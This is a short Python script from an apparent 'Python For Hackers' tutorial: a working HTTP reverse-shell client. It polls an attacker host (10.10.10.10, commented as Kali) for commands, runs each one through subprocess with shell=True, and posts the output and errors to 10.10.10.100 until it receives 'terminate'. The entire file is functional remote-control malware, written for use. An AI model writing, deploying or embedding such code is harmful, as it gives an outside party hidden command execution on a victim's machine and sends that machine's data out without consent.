# Python For Hackers : Priyank Gada
#www.youtube.com/priyankgada
# Reverse - HTTP- Shell - Client 
# watch tutorial first. 
#install requests library .

import requests     # imports request library 
import subprocess #system operations
import time    #import time lib


while True: 

    req = requests.get('http://10.10.10.10')      # This sends get request to the IP ( kali )
    command = req.text                             # Received text will be saved in command variable 
        
    if 'terminate' in command:
        break #terminate

    else:  #will execute the given command 
        CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        post_response = requests.post(url='http://10.10.10.100', data=CMD.stdout.read() )  # POST the result 
        post_response = requests.post(url='http://10.10.10.100', data=CMD.stderr.read() )  # POST the error

    time.sleep(3)
    #sleep for some time before next command.



